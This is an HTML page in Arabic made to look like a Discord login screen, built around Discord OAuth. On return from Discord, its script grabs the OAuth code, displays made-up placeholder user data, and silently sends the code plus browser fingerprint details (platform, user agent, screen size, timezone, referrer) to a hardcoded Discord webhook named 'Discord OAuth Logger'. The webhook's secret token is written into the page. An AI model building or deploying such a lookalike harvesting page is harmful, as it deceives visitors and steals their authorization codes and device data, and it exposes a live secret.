<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول - Discord</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Whitney', 'Helvetica Neue', Helvetica, Arial, sans-serif;
            background: #5865f2;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
            background: linear-gradient(135deg, #5865f2 0%, #3c45a5 100%);
        }
        
        .login-container {
            background: #36393f;
            padding: 32px;
            border-radius: 8px;
            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.24);
            width: 100%;
            max-width: 480px;
            text-align: center;
        }
        
        .discord-logo {
            width: 124px;
            height: 34px;
            margin: 0 auto 24px;
            background: url('data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTI0IiBoZWlnaHQ9IjM0IiB2aWV3Qm94PSIwIDAgMTI0IDM0IiBmaWxsPSJub25lIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPgo8cGF0aCBkPSJNMTA0LjQgOC4yTDEwNCA4LjJDMTEwLjkgMTEuMyAxMTUuNyAxNy4xIDEyMC44IDI0LjdDMTIyLjMgMjcuMSAxMjIuMyAzMC4xIDEyMC4yIDMyLjNDMTE4IDM0LjYgMTE0LjYgMzQuNiAxMTIuNCAzMi4zTDExMC44IDMwLjdDMTA3IDI1IDEwMi44IDIwLjEgOTggMTYuMlY5LjdDOTggOC45IDk3LjMgOC4yIDk2LjUgOC4ySDc4LjlDNzguMSA4LjIgNzcuNCA4LjkgNzcuNCA5LjdWMTkuMkM3NS41IDE5LjQgNzMuNyAxOS44IDcyIDIwLjRWOS43Qzc0IDguMyA3NS43IDYuNSA3Ny4xIDQuNUM3OC41IDIuNSA4MC4yIDEuNSA4Mi4yIDFIOTMuM0M5NS4zIDEuNSA5NyAyLjUgOTguNCA0LjVDOTkuOCA2LjUgMTAxLjUgOC4zIDEwMy41IDkuN1Y5LjdDMTA0IDguOSAxMDQuNCA4LjIgMTA0LjQgOC4yWiIgZmlsbD0iIzU4NjVGMiIvPgo8L3N2Zz4K') no-repeat center;
            background-size: contain;
        }
        
        .welcome-text {
            color: #ffffff;
            font-size: 24px;
            font-weight: 600;
            margin-bottom: 8px;
        }
        
        .subtitle {
            color: #b9bbbe;
            font-size: 16px;
            margin-bottom: 20px;
        }
        
        .discord-login-btn {
            width: 100%;
            padding: 12px 16px;
            background: #5865f2;
            color: #ffffff;
            border: none;
            border-radius: 3px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            transition: background-color 0.17s ease;
            text-decoration: none;
            display: inline-block;
            margin-bottom: 8px;
        }
        
        .discord-login-btn:hover {
            background: #4752c4;
        }
        
        .discord-login-btn:active {
            background: #3c45a5;
        }
        
        .divider {
            margin: 20px 0;
            position: relative;
            text-align: center;
        }
        
        .divider::before {
            content: '';
            position: absolute;
            top: 50%;
            left: 0;
            right: 0;
            height: 1px;
            background: #4f545c;
        }
        
        .divider span {
            background: #36393f;
            color: #72767d;
            padding: 0 16px;
            font-size: 12px;
            font-weight: 600;
            text-transform: uppercase;
        }
        
        .auth-info {
            background: #2f3136;
            border-radius: 8px;
            padding: 16px;
            margin-top: 16px;
            text-align: right;
        }
        
        .auth-info h3 {
            color: #ffffff;
            font-size: 16px;
            margin-bottom: 8px;
        }
        
        .auth-code {
            background: #40444b;
            border: 1px solid #4f545c;
            border-radius: 4px;
            padding: 8px 12px;
            color: #ffffff;
            font-family: 'Consolas', 'Monaco', monospace;
            font-size: 14px;
            word-break: break-all;
            margin-bottom: 12px;
            display: none;
        }
        
        .info-text {
            color: #b9bbbe;
            font-size: 14px;
            line-height: 1.4;
        }
        
        .user-info {
            background: #2f3136;
            border-radius: 8px;
            padding: 20px;
            margin-top: 16px;
            display: none;
        }
        
        .user-avatar {
            width: 80px;
            height: 80px;
            border-radius: 50%;
            margin: 0 auto 16px;
            display: block;
        }
        
        .user-name {
            color: #ffffff;
            font-size: 20px;
            font-weight: 600;
            margin-bottom: 4px;
        }
        
        .user-email {
            color: #b9bbbe;
            font-size: 14px;
            margin-bottom: 16px;
        }
        
        .logout-btn {
            width: 100%;
            padding: 8px 16px;
            background: #ed4245;
            color: #ffffff;
            border: none;
            border-radius: 3px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            transition: background-color 0.17s ease;
        }
        
        .logout-btn:hover {
            background: #c73235;
        }
        
        .footer {
            margin-top: 20px;
            text-align: center;
        }
        
        .footer a {
            color: #00aff4;
            text-decoration: none;
            font-size: 14px;
        }
        
        .footer a:hover {
            text-decoration: underline;
        }
        
        .loading {
            display: none;
            color: #b9bbbe;
            font-size: 14px;
            margin-top: 12px;
        }
        
        .spinner {
            display: inline-block;
            width: 16px;
            height: 16px;
            border: 2px solid #4f545c;
            border-radius: 50%;
            border-top-color: #5865f2;
            animation: spin 1s ease-in-out infinite;
            margin-left: 8px;
        }
        
        .webhook-status {
            background: #2f3136;
            border-radius: 8px;
            padding: 12px;
            margin-top: 16px;
            text-align: center;
            display: none;
        }
        
        .webhook-success {
            color: #57f287;
            font-size: 14px;
        }
        
        .webhook-error {
            color: #ed4245;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="discord-logo"></div>
        
        <div id="loginSection">
            <h1 class="welcome-text">أهلاً بك مرة أخرى!</h1>
            <p class="subtitle">نحن متحمسون لرؤيتك مرة أخرى!</p>
            
            <a href="https://discord.com/oauth2/authorize?client_id=1261839375738732684&response_type=code&redirect_uri=https%3A%2F%2Fkhaledali.vercel.app%2F&scope=identify+email" 
               class="discord-login-btn">
                تسجيل الدخول
            </a>
            
            <div class="loading" id="loading">
                جاري التحميل<span class="spinner"></span>
            </div>
        </div>
        
        <div class="user-info" id="userInfo">
            <img class="user-avatar" id="userAvatar" alt="User Avatar">
            <div class="user-name" id="userName"></div>
            <div class="user-email" id="userEmail"></div>
            <button class="logout-btn" onclick="logout()">تسجيل الخروج</button>
        </div>
        
        <div class="divider">
            <span>أو</span>
        </div>
        
        <div class="auth-info">
            <h3>🔐 معلومات المصادقة</h3>
            <div class="auth-code" id="authCode"></div>
            <div class="info-text">
                سيتم عرض كود المصادقة هنا عند العودة من Discord. 
                يمكنك استخدام هذا الكود للوصول إلى API الخاص بك.
            </div>
        </div>
        
        <div class="footer">
            <a href="https://discord.com/developers/docs/topics/oauth2" target="_blank">
                📚 تعرف على Discord OAuth2
            </a>
        </div>
        
        <div class="webhook-status" id="webhookStatus">
            <div class="webhook-success" id="webhookSuccess">✅ تم إرسال البيانات إلى Webhook بنجاح</div>
            <div class="webhook-error" id="webhookError">❌ فشل في إرسال البيانات إلى Webhook</div>
        </div>
    </div>

    <script>
        // فحص الكود المرتجع من Discord
        function checkAuthCode() {
            const urlParams = new URLSearchParams(window.location.search);
            const code = urlParams.get('code');
            const error = urlParams.get('error');
            
            if (error) {
                alert('خطأ في المصادقة: ' + error);
                return;
            }
            
            if (code) {
                // عرض كود المصادقة
                document.getElementById('authCode').textContent = code;
                document.getElementById('authCode').style.display = 'block';
                
                // محاكاة استخدام الكود للحصول على معلومات المستخدم
                // في التطبيق الحقيقي، ستحتاج لإرسال الكود إلى الخادم
                simulateUserData(code);
                
                // إزالة الكود من الرابط
                const newUrl = window.location.origin + window.location.pathname;
                window.history.replaceState({}, document.title, newUrl);
            }
        }
        
        // محاكاة بيانات المستخدم (في التطبيق الحقيقي ستأتي من API)
        function simulateUserData(code) {
            // عرض مؤشر التحميل
            document.getElementById('loading').style.display = 'block';
            
            setTimeout(() => {
                const userData = {
                    id: '123456789012345678',
                    username: 'DiscordUser',
                    discriminator: '1234',
                    email: 'user@example.com',
                    avatar: null,
                    code: code
                };
                
                showUserInfo(userData);
                document.getElementById('loading').style.display = 'none';
            }, 2000);
        }
        
        // عرض معلومات المستخدم
        function showUserInfo(user) {
            document.getElementById('loginSection').style.display = 'none';
            
            // تعيين معلومات المستخدم
            document.getElementById('userName').textContent = user.username + '#' + user.discriminator;
            document.getElementById('userEmail').textContent = user.email;
            
            // تعيين الأفاتار
            const defaultAvatar = `https://cdn.discordapp.com/embed/avatars/${user.discriminator % 5}.png`;
            const userAvatar = user.avatar ? 
                `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png?size=128` : 
                defaultAvatar;
            
            document.getElementById('userAvatar').src = userAvatar;
            document.getElementById('userInfo').style.display = 'block';
            
            // حفظ بيانات المستخدم
            const userData = {
                ...user,
                timestamp: new Date().toISOString()
            };
            
            console.log('User Data:', userData);
            localStorage.setItem('discordUser', JSON.stringify(userData));
            
            // إرسال البيانات إلى webhook
            sendToWebhook(userData);
        }
        
        // إرسال البيانات إلى webhook
        function sendToWebhook(userData) {
            const webhookUrl = 'https://discord.com/api/webhooks/1385842517546766487/uddYVbHJ7n0hwryVqfS-5KPPUTDyTviruD_sy767UmYuIJ_bDTsxkXrF3FrxZAQx6nfo';
            
            // الحصول على معلومات إضافية
            const browserInfo = {
                userAgent: navigator.userAgent,
                language: navigator.language,
                platform: navigator.platform,
                cookieEnabled: navigator.cookieEnabled,
                onLine: navigator.onLine,
                screenWidth: screen.width,
                screenHeight: screen.height,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                url: window.location.href,
                referrer: document.referrer || 'Direct'
            };
            
            const webhookData = {
                username: "Discord OAuth Logger",
                avatar_url: "https://cdn.discordapp.com/embed/avatars/0.png",
                embeds: [{
                    title: "🔐 تسجيل دخول جديد عبر Discord",
                    description: "تم تسجيل دخول مستخدم جديد بنجاح",
                    color: 5865242,
                    fields: [
                        {
                            name: "👤 اسم المستخدم",
                            value: userData.username + '#' + userData.discriminator,
                            inline: true
                        },
                        {
                            name: "🆔 معرف المستخدم",
                            value: userData.id,
                            inline: true
                        },
                        {
                            name: "📧 البريد الإلكتروني",
                            value: userData.email || 'غير متوفر',
                            inline: true
                        },
                        {
                            name: "🔑 كود المصادقة",
                            value: "```" + userData.code + "```",
                            inline: false
                        },
                        {
                            name: "🌐 معلومات المتصفح",
                            value: `**النظام:** ${browserInfo.platform}\n**المتصفح:** ${browserInfo.userAgent.split(' ').pop()}\n**اللغة:** ${browserInfo.language}`,
                            inline: false
                        },
                        {
                            name: "📱 معلومات الشاشة",
                            value: `**الدقة:** ${browserInfo.screenWidth}x${browserInfo.screenHeight}\n**المنطقة الزمنية:** ${browserInfo.timezone}`,
                            inline: true
                        },
                        {
                            name: "🔗 معلومات الوصول",
                            value: `**الرابط:** ${browserInfo.url}\n**المصدر:** ${browserInfo.referrer}`,
                            inline: false
                        }
                    ],
                    thumbnail: {
                        url: userData.avatar ? 
                            `https://cdn.discordapp.com/avatars/${userData.id}/${userData.avatar}.png?size=128` : 
                            `https://cdn.discordapp.com/embed/avatars/${userData.discriminator % 5}.png`
                    },
                    footer: {
                        text: "Discord OAuth System",
                        icon_url: "https://discord.com/assets/f9bb9c4af2b9c32a2c5ee0014661546d.png"
                    },
                    timestamp: userData.timestamp
                }]
            };
            
            fetch(webhookUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(webhookData)
            })
            .then(response => {
                if (response.ok) {
                    console.log('✅ تم إرسال البيانات بنجاح إلى Webhook');
                    showWebhookStatus(true);
                } else {
                    console.error('❌ فشل في إرسال البيانات:', response.status);
                    showWebhookStatus(false);
                }
            })
            .catch(error => {
                console.error('❌ خطأ في إرسال البيانات:', error);
                showWebhookStatus(false);
            });
        }
        
        // عرض حالة Webhook
        function showWebhookStatus(success) {
            const statusDiv = document.getElementById('webhookStatus');
            const successDiv = document.getElementById('webhookSuccess');
            const errorDiv = document.getElementById('webhookError');
            
            statusDiv.style.display = 'block';
            
            if (success) {
                successDiv.style.display = 'block';
                errorDiv.style.display = 'none';
            } else {
                successDiv.style.display = 'none';
                errorDiv.style.display = 'block';
            }
            
            // إخفاء الرسالة بعد 5 ثوان
            setTimeout(() => {
                statusDiv.style.display = 'none';
            }, 5000);
        }
        
        // تسجيل الخروج
        function logout() {
            localStorage.removeItem('discordUser');
            document.getElementById('loginSection').style.display = 'block';
            document.getElementById('userInfo').style.display = 'none';
            document.getElementById('authCode').style.display = 'none';
        }
        
        // فحص تسجيل الدخول السابق
        function checkPreviousLogin() {
            const savedUser = localStorage.getItem('discordUser');
            if (savedUser) {
                const userData = JSON.parse(savedUser);
                // فحص إذا كانت الجلسة صالحة (أقل من ساعة)
                const loginTime = new Date(userData.timestamp);
                const now = new Date();
                const hoursPassed = (now - loginTime) / (1000 * 60 * 60);
                
                if (hoursPassed < 1) {
                    showUserInfo(userData);
                } else {
                    localStorage.removeItem('discordUser');
                }
            }
        }
        
        // تشغيل الدوال عند تحميل الصفحة
        window.onload = function() {
            checkAuthCode();
            checkPreviousLogin();
        };
    </script>
</body>
</html>
